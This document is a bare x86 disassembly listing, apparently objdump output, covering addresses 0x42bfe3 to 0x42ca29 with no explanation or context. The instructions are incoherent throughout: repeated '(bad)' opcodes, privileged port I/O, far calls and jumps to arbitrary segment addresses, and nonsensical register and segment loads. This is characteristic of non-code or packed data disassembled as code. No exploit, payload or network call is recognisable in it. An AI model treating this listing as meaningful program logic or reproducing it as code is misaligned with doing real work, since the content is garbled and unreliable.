  42bfe3:	xchg   ebp,eax
  42bfe4:	sbb    ebp,ebx
  42bfe6:	call   0xb5d4:0xf471eef4
  42bfed:	dec    eax
  42bfee:	mov    bh,ah
  42bff0:	data16 sub BYTE PTR [esp+edx*4+0x3353079d],dh
  42bff8:	dec    ebx
  42bff9:	adc    al,0x1f
  42bffb:	fcmovnu st,st(7)
  42bffd:	fadd   DWORD PTR [ecx]
  42bfff:	jg     0x42bfc0
  42c001:	fistp  DWORD PTR [ecx]
  42c003:	ja     0x42c00e
  42c005:	inc    ebx
  42c006:	and    eax,0xbc9efc51
  42c00b:	mov    ebp,0xfc807060
  42c010:	sub    BYTE PTR [eax],ah
  42c012:	sahf   
  42c013:	popa   
  42c014:	into   
  42c015:	sub    eax,0xc5d216c1
  42c01a:	adc    BYTE PTR [eax],ch
  42c01c:	mov    ds:0x9c3217e,al
  42c021:	pop    edx
  42c022:	xchg   DWORD PTR [ebx],ecx
  42c024:	mov    ds:0xf0d96544,eax
  42c029:	jge    0x42c063
  42c02b:	xor    DWORD PTR [ecx-0x64],0xa0bdb3e
  42c032:	add    DWORD PTR ds:0x356773f4,edx
  42c038:	test   al,0xdb
  42c03a:	mov    ecx,edi
  42c03c:	push   0x12
  42c03e:	jmp    0x42c090
  42c040:	or     BYTE PTR [edx+0x0],dh
	...
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xd942915
  42c0c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0c2:	aad    0x1
  42c0c4:	out    0xd2,al
  42c0c6:	add    DWORD PTR [eax],eax
  42c0c8:	test   BYTE PTR [eax],0x0
  42c0cb:	add    BYTE PTR [ebp+0x66c05884],cl
  42c0d1:	icebp  
  42c0d2:	ja     0x42c0fc
  42c0d4:	and    DWORD PTR [edi-0x7b05293c],esp
  42c0da:	(bad)  
  42c0db:	xor    ah,al
  42c0dd:	jmp    DWORD PTR [edx-0xe2a722f]
  42c0e3:	push   ebx
  42c0e4:	cmp    esp,edx
  42c0e6:	mov    cs,ebx
  42c0e8:	jmp    0x55a:0x3be4ef36
  42c0ef:	in     eax,0xcb
  42c0f1:	call   0x9a57:0x25e2d080
  42c0f8:	(bad)  
  42c0f9:	in     al,dx
  42c0fa:	stos   BYTE PTR es:[edi],al
  42c0fb:	neg    BYTE PTR [ebx-0x79745341]
  42c101:	xor    ebp,ebx
  42c103:	jae    0x42c12c
  42c105:	outs   dx,DWORD PTR ds:[esi]
  42c106:	pop    edx
  42c107:	gs in  al,0x19
  42c10a:	cld    
  42c10b:	stc    
  42c10c:	mov    ss,WORD PTR [ebx+0x11c1ea85]
  42c112:	in     eax,0xcb
  42c114:	sbb    eax,0x8b96ea79
  42c119:	fdivr  st(0),st
  42c11b:	and    ah,ah
  42c11d:	(bad)  
  42c11f:	test   eax,0x8d0bb65
  42c124:	mov    cs,WORD PTR [edx]
  42c126:	lock lods al,BYTE PTR ds:[esi]
  42c128:	cmp    bl,BYTE PTR [eax+ecx*8+0x8d444a9]
  42c12f:	ret    
  42c130:	jge    0x42c0da
  42c132:	cmp    eax,0x44da47dd
  42c137:	fsubr  st,st(0)
  42c139:	mov    edx,0x9b915f8f
  42c13e:	lods   al,BYTE PTR ds:[esi]
  42c13f:	add    DWORD PTR [edi+0x50e01985],ebp
  42c145:	xor    ebx,ecx
  42c147:	mov    al,ds:0xac571387
  42c14c:	dec    edx
  42c14d:	call   0xbb77e62d
  42c152:	or     dl,bl
  42c154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c155:	cmc    
  42c156:	xchg   edi,eax
  42c157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c158:	mov    eax,0x903966fc
  42c15d:	adc    eax,0xa4920aa4
  42c162:	clc    
  42c163:	sbb    BYTE PTR [eax-0x59],0xe1
  42c167:	out    0xf0,al
  42c169:	and    eax,0x7184c840
  42c16e:	js     0x42c173
  42c170:	lahf   
  42c171:	pop    ebx
  42c172:	fxch   st(5)
  42c174:	jns    0x42c116
  42c176:	das    
  42c177:	mov    ebx,0x24833588
  42c17c:	push   es
  42c17d:	daa    
  42c17e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c17f:	pop    es
  42c180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c181:	pop    edi
  42c182:	sub    eax,0xc1ee6d5a
  42c187:	push   esi
  42c188:	or     dh,BYTE PTR [edi+0x41]
  42c18b:	inc    ecx
  42c18c:	xchg   ebp,eax
  42c18d:	repz scas al,BYTE PTR es:[edi]
  42c18f:	sbb    ch,ch
  42c191:	mov    ch,0xb6
  42c193:	das    
  42c194:	sub    eax,ebx
  42c196:	mov    ah,0xbc
  42c198:	cmp    al,0x58
  42c19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c19b:	pop    ebp
  42c19c:	ret    
  42c19d:	pop    ds
  42c19e:	xchg   ecx,eax
  42c19f:	ja     0x42c1c8
  42c1a1:	sbb    DWORD PTR [eax],edx
  42c1a3:	out    dx,eax
  42c1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1a5:	and    bh,BYTE PTR [ebx+0x74]
  42c1a8:	push   ecx
  42c1a9:	cmp    eax,ecx
  42c1ab:	adc    eax,0x4227c5c5
  42c1b0:	cmp    BYTE PTR [edi],ah
  42c1b2:	stc    
  42c1b3:	dec    ebx
  42c1b4:	imul   ecx,DWORD PTR [esp+ecx*1+0x6f162c42],0xfbde0634
  42c1bf:	into   
  42c1c0:	mov    bh,0x52
	...
  42c232:	add    BYTE PTR [eax],al
  42c234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c235:	mov    ds,WORD PTR [ecx-0x28844a0]
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x40]
  42c241:	inc    esp
  42c242:	sbb    BYTE PTR ds:0x1d3dc,0xf6
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ebx+0xe],al
  42c24e:	fiadd  WORD PTR [esi+0x31f1c1d6]
  42c254:	add    esp,0xfffffffe
  42c257:	dec    edi
  42c258:	hlt    
  42c259:	or     al,0x67
  42c25b:	push   edi
  42c25c:	adc    dh,cl
  42c25e:	ret    0x1ba3
  42c261:	or     BYTE PTR [edi-0x68],ch
  42c264:	jbe    0x42c259
  42c266:	dec    ebx
  42c267:	or     edx,DWORD PTR [ecx-0x3af4bdb8]
  42c26d:	add    ebp,eax
  42c26f:	and    DWORD PTR [edx-0x58af0393],eax
  42c275:	in     al,0x19
  42c277:	xchg   DWORD PTR [edi-0x4192419b],edx
  42c27d:	or     DWORD PTR [edx],ebx
  42c27f:	lods   al,BYTE PTR ds:[esi]
  42c280:	loop   0x42c24f
  42c282:	dec    edx
  42c283:	lock pop eax
  42c285:	popf   
  42c286:	aas    
  42c287:	adc    BYTE PTR cs:0xf0715d4,bh
  42c28e:	mov    al,ds:0x481ca05f
  42c293:	fcos   
  42c295:	not    dh
  42c297:	sbb    eax,0xef8c43ed
  42c29c:	in     al,dx
  42c29d:	adc    DWORD PTR [ebx],ecx
  42c29f:	jbe    0x42c287
  42c2a1:	retf   0x8730
  42c2a4:	adc    DWORD PTR [ebp-0x375c4943],ecx
  42c2aa:	push   edx
  42c2ab:	mov    ebx,0xe63e13fc
  42c2b0:	sub    eax,0x441aaaf7
  42c2b5:	cmc    
  42c2b6:	lods   eax,DWORD PTR ds:[esi]
  42c2b7:	gs dec bp
  42c2ba:	fst    st(5)
  42c2bc:	stos   BYTE PTR es:[edi],al
  42c2bd:	fsubrp st(7),st
  42c2bf:	(bad)  
  42c2c0:	mov    ds:0xe0ed34,al
  42c2c5:	pop    edi
  42c2c6:	cld    
  42c2c7:	out    dx,al
  42c2c8:	rcr    BYTE PTR [ecx-0x38],1
  42c2cb:	adc    edi,DWORD PTR [esi+edx*8-0x41e0212]
  42c2d2:	imul   edi,DWORD PTR [ebx+0x4b],0xa6db2546
  42c2d9:	mov    BYTE PTR [ecx-0x56],al
  42c2dc:	xchg   ecx,eax
  42c2dd:	add    bh,BYTE PTR [edx+0x70f6b3fd]
  42c2e3:	dec    edx
  42c2e4:	aaa    
  42c2e5:	mov    cl,0x24
  42c2e7:	mov    ss,WORD PTR [edi-0x14]
  42c2ea:	jae    0x42c364
  42c2ec:	push   edx
  42c2ed:	fs std 
  42c2ef:	out    dx,eax
  42c2f0:	mov    ss,esp
  42c2f2:	imul   DWORD PTR [esi+0x641af6e1]
  42c2f8:	sbb    edi,DWORD PTR [esi-0x5f7c1be3]
  42c2fe:	imul   edi,ecx,0x568b6163
  42c304:	mov    eax,ds:0x7776112f
  42c309:	adc    BYTE PTR [ebp-0x35],0x91
  42c30d:	xchg   ecx,eax
  42c30e:	jl     0x42c29f
  42c310:	(bad)  
  42c311:	mov    dh,0xb6
  42c313:	xchg   esp,eax
  42c314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c315:	mov    ?,eax
  42c317:	jl     0x42c31b
  42c319:	jnp    0x42c337
  42c31b:	cmp    ecx,DWORD PTR [ebp-0x40]
  42c31e:	push   ds
  42c31f:	add    al,0xfb
  42c321:	jbe    0x42c2b3
  42c323:	daa    
  42c324:	fimul  DWORD PTR [ebx+0x6a5238a1]
  42c32a:	je     0x42c2d4
  42c32c:	jmp    0x42c3a1
  42c32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c32f:	add    eax,0xec8f5f08
  42c334:	(bad)  
  42c335:	cmp    ebp,DWORD PTR [esi-0x6ef57aae]
  42c33b:	lods   al,BYTE PTR ds:[esi]
  42c33c:	or     edi,DWORD PTR [esi-0x2a84bacd]
	...
  42c3b2:	add    BYTE PTR [eax],al
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x13]
  42c3c1:	push   ecx
  42c3c2:	cmp    dh,BYTE PTR ds:0x1d4d2
  42c3c8:	test   BYTE PTR [eax],0x0
  42c3cb:	add    BYTE PTR [esi-0x22],al
  42c3ce:	mov    dh,0x9
  42c3d0:	mov    edi,0x6381f033
  42c3d5:	push   es
  42c3d6:	stos   DWORD PTR es:[edi],eax
  42c3d7:	test   al,0xcb
  42c3d9:	and    bh,BYTE PTR [ebx]
  42c3db:	inc    ecx
  42c3dc:	or     ch,BYTE PTR [eax-0x5d]
  42c3df:	mov    eax,ds:0x738c89c2
  42c3e4:	push   ecx
  42c3e5:	retf   
  42c3e6:	add    eax,0x5a23edd3
  42c3eb:	jp     0x42c370
  42c3ed:	mov    edx,0x5b3207bd
  42c3f2:	dec    eax
  42c3f3:	jmp    0xdb72:0x656f1539
  42c3fa:	mov    esp,0xe1ea2988
  42c3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c400:	jnp    0x42c3ef
  42c402:	jl     0x42c3cc
  42c404:	pop    ss
  42c405:	enter  0xeb32,0x79
  42c409:	cmp    eax,0x272b1a46
  42c40e:	jo     0x42c40b
  42c410:	adc    DWORD PTR [ebp-0x6b],0xc6a1327a
  42c417:	cwde   
  42c418:	mov    edi,0x146a0124
  42c41d:	jmp    0x92923f43
  42c422:	and    eax,0x9874ba87
  42c427:	fwait
  42c428:	jno    0x42c411
  42c42a:	xchg   ebx,eax
  42c42b:	neg    al
  42c42d:	dec    esi
  42c42e:	inc    esi
  42c42f:	jae    0x42c3b4
  42c431:	sbb    eax,0xfbc50e46
  42c436:	(bad)  
  42c437:	outs   dx,BYTE PTR ds:[esi]
  42c438:	clc    
  42c439:	scas   al,BYTE PTR es:[edi]
  42c43a:	mov    dl,0x54
  42c43c:	or     esi,DWORD PTR [eax-0x3625516e]
  42c442:	loop   0x42c40e
  42c444:	add    al,0xee
  42c446:	push   ebx
  42c448:	push   esp
  42c44a:	stc    
  42c44b:	push   edx
  42c44c:	mov    ch,0x2e
  42c44e:	dec    edx
  42c44f:	outs   dx,DWORD PTR ds:[esi]
  42c450:	mov    al,ds:0x5feea8e2
  42c455:	inc    ebp
  42c456:	push   cs
  42c457:	mov    edx,0xcbc565f8
  42c45c:	push   ds
  42c45d:	mov    ds:0xa83c9e4c,al
  42c462:	mov    esp,0x9f1ab7ae
  42c467:	jmp    0x5f864490
  42c46c:	adc    eax,0x2c7c8d56
  42c471:	inc    edx
  42c472:	ins    DWORD PTR es:[edi],dx
  42c473:	push   cs
  42c474:	sbb    DWORD PTR [edi],0xffffffc8
  42c477:	sbb    BYTE PTR [edx],al
  42c479:	or     DWORD PTR [ecx+0x71],esp
  42c47c:	mov    bl,0x77
  42c47e:	ror    BYTE PTR [ebx],cl
  42c480:	xor    DWORD PTR [edi+0x5e],0x15
  42c484:	mov    ecx,DWORD PTR [edx]
  42c486:	push   es
  42c487:	mov    ds:0x597ba063,al
  42c48c:	jmp    0x42c4fb
  42c48e:	sub    al,0xe2
  42c490:	pop    edi
  42c491:	jo     0x42c50d
  42c493:	adc    DWORD PTR [ecx-0x598bcaf1],0xd3dc46c5
  42c49d:	xchg   esi,eax
  42c49e:	jne    0x42c4e7
  42c4a0:	pop    edx
  42c4a1:	pop    eax
  42c4a2:	inc    ebx
  42c4a3:	iret   
  42c4a4:	sub    ch,ch
  42c4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4a7:	aad    0xf2
  42c4a9:	stos   BYTE PTR es:[edi],al
  42c4aa:	into   
  42c4ab:	in     eax,dx
  42c4ac:	inc    edi
  42c4ad:	fistp  WORD PTR [edi+0x8ec64b1]
  42c4b3:	int3   
  42c4b4:	and    eax,0x7a1f91e0
  42c4b9:	dec    eax
  42c4ba:	inc    edi
  42c4bb:	cli    
  42c4bc:	icebp  
  42c4bd:	adc    eax,0x1a130d46
	...
  42c532:	add    BYTE PTR [eax],al
  42c534:	loopne 0x42c4ca
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	(bad)  
  42c541:	fwait
  42c542:	dec    edx
  42c543:	mov    esi,0x1d5c8
  42c548:	test   BYTE PTR [eax],0x0
  42c54b:	add    cl,bh
  42c54d:	mov    esi,DWORD PTR [ebp-0x40]
  42c550:	into   
  42c551:	xchg   esp,eax
  42c552:	or     eax,0x862a1e43
  42c557:	sbb    ecx,DWORD PTR [ecx+ebp*2]
  42c55a:	retf   0x2534
  42c55d:	mov    bl,0xfd
  42c55f:	ins    DWORD PTR es:[edi],dx
  42c560:	cs and ecx,0x4044e4c9
  42c567:	add    BYTE PTR [ebp-0x41a1cbb8],al
  42c56d:	adc    esi,esp
  42c56f:	ja     0x42c5a4
  42c571:	pop    ss
  42c572:	hlt    
  42c573:	loopne 0x42c55f
  42c575:	xchg   BYTE PTR [ebx+0x67],cl
  42c578:	xor    bl,BYTE PTR [edx+edx*4+0x5b624996]
  42c57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c580:	pop    esp
  42c581:	scas   eax,DWORD PTR es:[edi]
  42c582:	jl     0x42c589
  42c584:	in     al,0xf6
  42c586:	in     eax,dx
  42c587:	inc    ecx
  42c588:	cmc    
  42c589:	adc    edi,DWORD PTR fs:[ebx-0xa3f1072]
  42c590:	pushw  ss
  42c592:	push   0xacbf1d79
  42c597:	push   ds
  42c598:	lahf   
  42c599:	xchg   BYTE PTR [ecx+0x3e],bh
  42c59c:	mov    edi,0x944f0fbb
  42c5a1:	les    ecx,FWORD PTR [edi]
  42c5a3:	adc    al,0x1c
  42c5a5:	inc    eax
  42c5a6:	(bad)  [ebx-0x4519e048]
  42c5ac:	leave  
  42c5ad:	and    al,0xdf
  42c5af:	cld    
  42c5b0:	retf   0x4eee
  42c5b3:	sbb    ebx,DWORD PTR [ebx+0x24c577b1]
  42c5b9:	pop    edi
  42c5ba:	mov    ch,0x42
  42c5bc:	add    ebx,DWORD PTR [edi]
  42c5be:	sub    esp,DWORD PTR [esi-0x20]
  42c5c1:	add    dl,dh
  42c5c3:	leave  
  42c5c4:	dec    edx
  42c5c5:	mov    ch,0x86
  42c5c7:	fcmovu st,st(6)
  42c5c9:	pminub mm3,QWORD PTR ds:0xbf87495f
  42c5d0:	adc    DWORD PTR [ecx+0x7f1105d],esp
  42c5d6:	sbb    BYTE PTR [edi+0x4e],ch
  42c5d9:	adc    ebx,eax
  42c5db:	ja     0x42c61a
  42c5dd:	shr    DWORD PTR [ebx],cl
  42c5df:	or     esi,DWORD PTR [eax]
  42c5e1:	sbb    ch,BYTE PTR ds:[ecx+0x1b]
  42c5e5:	sahf   
  42c5e6:	jb     0x42c585
  42c5e8:	les    ebx,FWORD PTR [ebx+0x3a85b092]
  42c5ee:	sub    al,0x69
  42c5f0:	psllq  mm5,QWORD PTR [ecx+eax*1]
  42c5f4:	dec    ecx
  42c5f5:	inc    ebx
  42c5f6:	xchg   esi,eax
  42c5f7:	(bad)  
  42c5f8:	or     al,0xb5
  42c5fa:	ins    DWORD PTR es:[edi],dx
  42c5fb:	xchg   esp,eax
  42c5fc:	lahf   
  42c5fd:	sti    
  42c5fe:	adc    BYTE PTR [eax+ebp*2+0x61],cl
  42c602:	add    BYTE PTR [ebx-0x48],cl
  42c605:	mov    dl,0x41
  42c607:	aad    0xa9
  42c609:	xchg   edi,eax
  42c60a:	jo     0x42c5f4
  42c60c:	mov    ecx,0x40075dde
  42c611:	fwait
  42c612:	cmp    edx,DWORD PTR [eax-0x4845aa35]
  42c618:	add    DWORD PTR [ebx-0x73c1a17a],0x3e
  42c61f:	ins    BYTE PTR es:[edi],dx
  42c620:	pusha  
  42c621:	xchg   ecx,eax
  42c622:	sbb    eax,0x6b8fef81
  42c627:	jo     0x42c64f
  42c629:	inc    ebp
  42c62a:	dec    esp
  42c62b:	lea    ebp,[edi-0x6]
  42c62e:	mov    eax,ds:0x35f1efd9
  42c633:	add    al,0x87
  42c635:	jo     0x42c619
  42c637:	jnp    0x42c649
  42c639:	cwde   
  42c63a:	push   ds
  42c63b:	push   edi
  42c63c:	push   0x6733cd22
  42c641:	scas   al,BYTE PTR es:[edi]
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x10be,0x24
  42c6c2:	xchg   esp,eax
  42c6c3:	call   0xf6:0x1d6be
  42c6ca:	add    BYTE PTR [eax],al
  42c6cc:	stc    
  42c6cd:	adc    cl,BYTE PTR [ecx-0x6e2d540f]
  42c6d3:	mov    eax,0xbc689eb8
  42c6d8:	pop    ebp
  42c6d9:	jbe    0x42c6ff
  42c6db:	mov    ebp,0x3458795e
  42c6e0:	pop    eax
  42c6e1:	sub    dh,BYTE PTR [edx]
  42c6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c6e4:	sbb    DWORD PTR [ebx-0x6d],0x4b7015f6
  42c6eb:	pop    esp
  42c6ec:	ret    
  42c6ed:	or     DWORD PTR [ecx],eax
  42c6ef:	call   0xcfc7bfde
  42c6f4:	inc    edi
  42c6f5:	aas    
  42c6f6:	mov    BYTE PTR [edi],dl
  42c6f8:	adc    DWORD PTR gs:[esp+edx*1+0x62],eax
  42c6fd:	push   edi
  42c6fe:	push   eax
  42c6ff:	dec    edx
  42c700:	mov    esp,0x2bba286f
  42c705:	sub    DWORD PTR [edx-0x65],ebp
  42c708:	nop
  42c709:	cwde   
  42c70a:	or     esi,DWORD PTR [edi]
  42c70c:	pop    ecx
  42c70d:	out    dx,al
  42c70e:	sub    BYTE PTR [edi],bl
  42c710:	inc    ebx
  42c711:	std    
  42c712:	sbb    edx,edi
  42c714:	ficom  WORD PTR [edx-0x6]
  42c717:	mov    ch,0xaf
  42c719:	scas   al,BYTE PTR es:[edi]
  42c71a:	shl    cl,1
  42c71c:	stos   BYTE PTR es:[edi],al
  42c71d:	enter  0x3c61,0x84
  42c721:	ror    DWORD PTR [eax+0x6f5be3bc],cl
  42c727:	shl    DWORD PTR ds:0x30119598,cl
  42c72d:	cmc    
  42c72e:	leave  
  42c72f:	jne    0x42c76b
  42c731:	sub    dh,BYTE PTR [edi]
  42c733:	call   0xa9a2:0x26158ae1
  42c73a:	scas   al,BYTE PTR es:[edi]
  42c73b:	jp     0x183ca774
  42c741:	push   esi
  42c742:	push   edi
  42c743:	pop    ds
  42c744:	pop    ecx
  42c745:	mov    edx,0x33c26aba
  42c74a:	ret    
  42c74b:	cwde   
  42c74c:	xchg   ecx,eax
  42c74d:	aam    0xec
  42c74f:	xor    esp,DWORD PTR [esi+edx*1-0x5c]
  42c753:	js     0x42c736
  42c755:	push   eax
  42c756:	cmp    esi,esi
  42c758:	cmp    al,0x69
  42c75a:	push   edi
  42c75b:	sub    edx,edx
  42c75d:	jo     0x42c785
  42c75f:	call   0xc0f8f8b5
  42c764:	psrad  mm7,QWORD PTR [edx-0x41]
  42c768:	dec    esp
  42c769:	xchg   ebp,eax
  42c76a:	pop    ecx
  42c76b:	dec    ebp
  42c76c:	rcr    BYTE PTR [ebp-0x2d8faa77],1
  42c772:	xor    BYTE PTR [eax],dh
  42c774:	fadd   QWORD PTR ds:0x1da0c4b3
  42c77a:	or     bl,BYTE PTR [eax+0xf]
  42c77d:	xor    eax,0x9c190711
  42c782:	cmp    BYTE PTR [ecx+0x72],ch
  42c785:	sbb    al,0x14
  42c787:	and    DWORD PTR [edi+edx*1],0xd1dab224
  42c78e:	jns    0x42c7f5
  42c790:	retf   
  42c791:	shl    eax,1
  42c793:	pop    ecx
  42c794:	mov    ah,0xb2
  42c796:	lahf   
  42c797:	aam    0xc2
  42c799:	xchg   edx,eax
  42c79a:	lock push ss
  42c79c:	cmp    ch,BYTE PTR [ecx+0x64cdaee6]
  42c7a2:	mov    ch,0x9
  42c7a4:	fs xchg ebp,eax
  42c7a6:	push   cs
  42c7a7:	push   0x9f750b67
  42c7ac:	pop    ebx
  42c7ad:	fisttp QWORD PTR [eax+0x6a]
  42c7b0:	lea    ebp,[esi-0x7c8d4618]
  42c7b6:	clc    
  42c7b7:	out    dx,eax
  42c7b8:	pop    esp
  42c7b9:	push   esp
  42c7ba:	jge    0x42c834
  42c7bc:	pop    esp
  42c7bd:	inc    esi
  42c7be:	add    DWORD PTR [eax-0x6b],eax
  42c7c1:	mov    BYTE PTR [eax],al
	...
  42c833:	add    al,ch
  42c835:	popf   
  42c836:	mov    esi,0xf9e7ffe7
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xb76e6689
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    bl,ch
  42c84d:	and    bl,BYTE PTR [ebx]
  42c84f:	jae    0x42c851
  42c851:	sbb    ch,BYTE PTR [eax-0x52]
  42c854:	scas   al,BYTE PTR es:[edi]
  42c855:	aad    0x5b
  42c857:	inc    ebp
  42c858:	in     eax,0x13
  42c85a:	sub    dh,al
  42c85c:	xor    DWORD PTR [esi+ebx*1],edi
  42c85f:	imul   edx,DWORD PTR [esi],0x61b20b05
  42c865:	mov    BYTE PTR [ebx+0x36445e60],dl
  42c86b:	pop    esi
  42c86c:	sub    al,0x21
  42c86e:	gs jl  0x42c830
  42c871:	or     BYTE PTR [eax+esi*1-0x3b2d3ed5],dl
  42c878:	adc    BYTE PTR [edx],bh
  42c87a:	repz bound ecx,QWORD PTR [esi+eax*1]
  42c87e:	repz jl 0x42c8c6
  42c881:	xor    DWORD PTR [ecx],edi
  42c883:	and    BYTE PTR fs:[edx],dl
  42c886:	xor    dl,dh
  42c888:	push   cs
  42c889:	dec    esp
  42c88a:	sub    edi,esp
  42c88c:	adc    BYTE PTR [edi+0x60a374e7],al
  42c892:	cs inc edx
  42c894:	inc    esi
  42c895:	xor    DWORD PTR [edi-0x55],esi
  42c898:	sub    DWORD PTR [eax],eax
  42c89a:	test   al,0xc5
  42c89c:	aad    0x69
  42c89e:	js     0x42c915
  42c8a0:	repnz jecxz 0x42c88e
  42c8a3:	cdq    
  42c8a4:	ins    BYTE PTR es:[edi],dx
  42c8a5:	dec    esp
  42c8a6:	shl    dh,1
  42c8a8:	adc    eax,0x5d63c357
  42c8ad:	dec    eax
  42c8ae:	push   eax
  42c8af:	pop    ss
  42c8b0:	arpl   WORD PTR [ecx],di
  42c8b2:	pop    ss
  42c8b3:	or     BYTE PTR [eax],bl
  42c8b5:	loop   0x42c874
  42c8b7:	jl     0x42c926
  42c8b9:	fimul  WORD PTR [edi-0x35954104]
  42c8bf:	jge    0x42c8db
  42c8c1:	pop    eax
  42c8c2:	es mov bh,0xec
  42c8c5:	sbb    BYTE PTR [ebx],ch
  42c8c7:	ror    DWORD PTR [eax-0x1e985c17],cl
  42c8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8cf:	fist   DWORD PTR [ecx+0x7ab7dee2]
  42c8d5:	sbb    al,0xb2
  42c8d7:	aaa    
  42c8d8:	xchg   ecx,eax
  42c8d9:	mov    cl,0x91
  42c8db:	jmp    0x422:0xf8120033
  42c8e2:	popa   
  42c8e3:	aad    0xa1
  42c8e5:	add    bl,BYTE PTR [edi]
  42c8e7:	fist   WORD PTR [eax-0xb909d9a]
  42c8ed:	xchg   ecx,eax
  42c8ee:	or     al,ch
  42c8f0:	cmp    eax,0x5284ef2e
  42c8f5:	daa    
  42c8f6:	cli    
  42c8f7:	or     DWORD PTR [edi+0x54],esi
  42c8fa:	mov    dl,0x8f
  42c8fc:	pop    edx
  42c8fd:	nop
  42c8fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8ff:	fidiv  WORD PTR [ecx-0x6e3aba85]
  42c905:	pop    ss
  42c906:	pusha  
  42c907:	jnp    0x42c89a
  42c909:	inc    esp
  42c90a:	jmp    0x42c8a9
  42c90c:	nop
  42c90d:	sbb    DWORD PTR [ecx],esp
  42c90f:	mov    dh,BYTE PTR [edx+0x43]
  42c912:	aaa    
  42c913:	push   edi
  42c914:	jge    0x42c8ce
  42c916:	sbb    esi,DWORD PTR [ebx+0x6a45620a]
  42c91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c91d:	stc    
  42c91e:	mov    esi,esi
  42c920:	call   FWORD PTR [edi+0x2b]
  42c923:	inc    ebx
  42c924:	mov    ds:0x578784e9,al
  42c929:	adc    DWORD PTR [ebx+0x43],0xbfa38e93
  42c930:	lods   eax,DWORD PTR ds:[esi]
  42c931:	and    ch,bh
  42c933:	xlat   BYTE PTR ds:[ebx]
  42c934:	cld    
  42c935:	xchg   ebx,eax
  42c936:	push   ecx
  42c937:	inc    edx
  42c938:	lods   al,BYTE PTR ds:[esi]
  42c939:	sti    
  42c93a:	sbb    esi,DWORD PTR [edx+eiz*4+0x63]
  42c93e:	cmp    DWORD PTR [esi+0x37],edi
  42c941:	loopne 0x42c943
	...
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    ah,ah
  42c9c1:	sti    
  42c9c2:	mov    bl,0xc2
  42c9c4:	stos   BYTE PTR es:[edi],al
  42c9c5:	fadd   DWORD PTR [ecx]
  42c9c7:	add    dh,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [ecx],dh
  42c9cd:	adc    al,0x37
  42c9cf:	rol    DWORD PTR [edi-0x7c],1
  42c9d2:	pop    ebp
  42c9d3:	fist   WORD PTR [edi+0x31]
  42c9d6:	inc    ebx
  42c9d7:	xchg   bl,al
  42c9d9:	cmp    eax,0xa5d8f81
  42c9de:	push   edi
  42c9df:	jle    0x42ca58
  42c9e1:	pop    ss
  42c9e2:	push   edi
  42c9e3:	or     ch,dh
  42c9e5:	js     0x42c99c
  42c9e7:	mov    ss,WORD PTR [edx-0x35]
  42c9ea:	fs jle 0x42c98b
  42c9ed:	or     al,BYTE PTR [eax+ebx*4-0x42]
  42c9f1:	mov    BYTE PTR [ebp-0x5389b8a3],al
  42c9f7:	hlt    
  42c9f8:	sti    
  42c9f9:	test   BYTE PTR [esi+0x28],bl
  42c9fc:	or     eax,DWORD PTR [ebx]
  42c9fe:	mov    al,BYTE PTR [ebx+0x7f]
  42ca01:	popf   
  42ca02:	(bad)  
  42ca03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca04:	or     esi,DWORD PTR [eax]
  42ca06:	inc    ecx
  42ca07:	in     al,dx
  42ca08:	fdivr  DWORD PTR [esi+ebx*4+0x68]
  42ca0c:	mov    al,ds:0x2f705ed2
  42ca11:	lods   eax,DWORD PTR ds:[esi]
  42ca12:	sar    BYTE PTR [edx],1
  42ca14:	addr16 mov esp,0x767b76a9
  42ca1a:	xchg   edi,eax
  42ca1b:	pop    edi
  42ca1c:	loop   0x42ca61
  42ca1e:	ret    
  42ca1f:	ins    BYTE PTR es:[edi],dx
  42ca20:	inc    ebx
  42ca21:	jb     0x42ca63
  42ca23:	(bad)  
  42ca24:	fs inc edx
  42ca26:	push   ds
  42ca27:	add    al,0x37
  42ca29:	mov    ebp,0x10a66eeb
